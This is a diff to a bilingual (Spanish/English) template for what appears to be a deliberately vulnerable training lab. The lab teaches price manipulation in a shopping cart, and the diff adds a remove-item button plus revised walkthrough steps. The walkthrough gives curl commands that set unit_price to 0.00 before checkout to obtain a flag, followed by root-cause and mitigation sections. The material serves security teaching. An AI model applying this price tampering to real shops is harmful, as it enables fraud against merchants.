@@ -38,9 +38,10 @@
     </div>
     {% if cart %}
       {% for item in cart %}
-      <div class="flex justify-between text-xs font-mono py-2 border-b" style="border-color:rgba(255,255,255,.08)">
-        <span>{{ item.name }} × {{ item.quantity }}</span>
+      <div class="flex justify-between items-center gap-3 text-xs font-mono py-2 border-b" style="border-color:rgba(255,255,255,.08)">
+        <span class="flex-1">{{ item.name }} × {{ item.quantity }}</span>
         <span>${{ '%.2f'|format(item.unit_price_cents * item.quantity / 100) }}</span>
+        <button type="button" class="price-remove-item text-red-400 hover:text-red-300" data-line-id="{{ item.line_id }}" data-i18n="price_remove_item">Eliminar</button>
       </div>
       {% endfor %}
       <div class="flex justify-between font-semibold mt-3"><span>Total</span><span>${{ '%.2f'|format(total_cents / 100) }}</span></div>
@@ -55,19 +56,18 @@
 </div>
 
 <script>
-document.getElementById('price-add-form')?.addEventListener('submit', async (event) => {
-  event.preventDefault();
-  const form = event.currentTarget;
-  const body = Object.fromEntries(new FormData(form).entries());
-  body.quantity = Number(body.quantity);
-  const response = await fetch(form.action, {method: 'POST', headers: {'Content-Type': 'application/json'}, body: JSON.stringify(body)});
-  document.getElementById('price-api-result').textContent = JSON.stringify(await response.json(), null, 2);
-  if (response.ok) setTimeout(() => location.reload(), 500);
-});
 document.getElementById('price-checkout')?.addEventListener('click', async () => {
   const response = await fetch('/price-manipulation/api/checkout', {method: 'POST'});
   const data = await response.json();
   document.getElementById('price-api-result').textContent = JSON.stringify(data, null, 2);
+});
+document.querySelectorAll('.price-remove-item').forEach((button) => {
+  button.addEventListener('click', async () => {
+    const response = await fetch(`/price-manipulation/api/cart/items/${encodeURIComponent(button.dataset.lineId)}`, {method: 'DELETE'});
+    const data = await response.json();
+    document.getElementById('price-api-result').textContent = JSON.stringify(data, null, 2);
+    if (response.ok) location.reload();
+  });
 });
 </script>
 
@@ -76,17 +76,17 @@ document.getElementById('price-checkout')?.addEventListener('click', async () =>
     <h3>Explotación</h3>
     <ol>
       <li>Abre DevTools o intercepta <code>POST /price-manipulation/api/cart/items</code> con Burp.</li>
-      <li>El JSON contiene <code>product_id</code>, <code>quantity</code> y <code>unit_price</code>. Modifica únicamente <code>unit_price</code> a <code>0.00</code>.</li>
+      <li>El body contiene <code>product_id</code>, <code>quantity</code> y <code>unit_price</code>. Modifica únicamente <code>unit_price</code> a <code>0.00</code>.</li>
+      <li>Si añades una línea incorrecta, usa <strong>Eliminar</strong> junto al artículo. La API también permite borrarla mediante su <code>line_id</code>.</li>
       <li>El carrito del servidor mostrará total $0.00. Ejecuta el checkout sin volver a añadir el producto.</li>
       <li>La respuesta JSON de la orden incluye <code>HL{···}</code>.</li>
     </ol>
-    <pre>curl -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie \
-  -H 'Content-Type: application/json' \
-  -d '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' \
-  {{ target_base }}/price-manipulation/api/cart/items
+    <pre>curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -H 'Content-Type: application/json' --data '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' '{{ target_base }}/price-manipulation/api/cart/items'
 
-curl -b /tmp/hl-price.cookie -X POST \
-  {{ target_base }}/price-manipulation/api/checkout</pre>
+curl --fail-with-body -sS -b /tmp/hl-price.cookie -X POST '{{ target_base }}/price-manipulation/api/checkout'</pre>
+    <h3>Eliminar una línea del carrito</h3>
+    <pre>LINE_ID=$(curl --fail-with-body -sS -b /tmp/hl-price.cookie '{{ target_base }}/price-manipulation/api/cart/items' | jq -r '.items[0].line_id')
+curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -X DELETE "{{ target_base }}/price-manipulation/api/cart/items/${LINE_ID}"</pre>
     <h3>Causa raíz</h3><p>El backend persiste el precio enviado por el cliente. El checkout recalcula desde un carrito del servidor, pero ese carrito ya contiene datos manipulados; «server-side» no equivale a «confiable».</p>
     <h3>Mitigación</h3><pre># Aceptar solo product_id y quantity
 unit_price = catalog.get(product_id).price
@@ -96,17 +96,17 @@ unit_price = catalog.get(product_id).price
     <h3>Exploitation</h3>
     <ol>
       <li>Open DevTools or intercept <code>POST /price-manipulation/api/cart/items</code> with Burp.</li>
-      <li>The JSON contains <code>product_id</code>, <code>quantity</code>, and <code>unit_price</code>. Change only <code>unit_price</code> to <code>0.00</code>.</li>
+      <li>The request body contains <code>product_id</code>, <code>quantity</code>, and <code>unit_price</code>. Change only <code>unit_price</code> to <code>0.00</code>.</li>
+      <li>If you add the wrong line, use <strong>Remove</strong> next to that item. The API can also delete it by its <code>line_id</code>.</li>
       <li>The server cart now totals $0.00. Check out without adding the product again.</li>
       <li>The order JSON response includes <code>HL{···}</code>.</li>
     </ol>
-    <pre>curl -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie \
-  -H 'Content-Type: application/json' \
-  -d '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' \
-  {{ target_base }}/price-manipulation/api/cart/items
+    <pre>curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -H 'Content-Type: application/json' --data '{"product_id":"hsm-enterprise-1","quantity":1,"unit_price":"0.00"}' '{{ target_base }}/price-manipulation/api/cart/items'
 
-curl -b /tmp/hl-price.cookie -X POST \
-  {{ target_base }}/price-manipulation/api/checkout</pre>
+curl --fail-with-body -sS -b /tmp/hl-price.cookie -X POST '{{ target_base }}/price-manipulation/api/checkout'</pre>
+    <h3>Remove one cart line</h3>
+    <pre>LINE_ID=$(curl --fail-with-body -sS -b /tmp/hl-price.cookie '{{ target_base }}/price-manipulation/api/cart/items' | jq -r '.items[0].line_id')
+curl --fail-with-body -sS -c /tmp/hl-price.cookie -b /tmp/hl-price.cookie -X DELETE "{{ target_base }}/price-manipulation/api/cart/items/${LINE_ID}"</pre>
     <h3>Root cause</h3><p>The backend persists a client-supplied price. Checkout recomputes from a server-side cart, but the cart already contains tainted data; server-side does not automatically mean trusted.</p>
     <h3>Mitigation</h3><pre># Accept product_id and quantity only
 unit_price = catalog.get(product_id).price
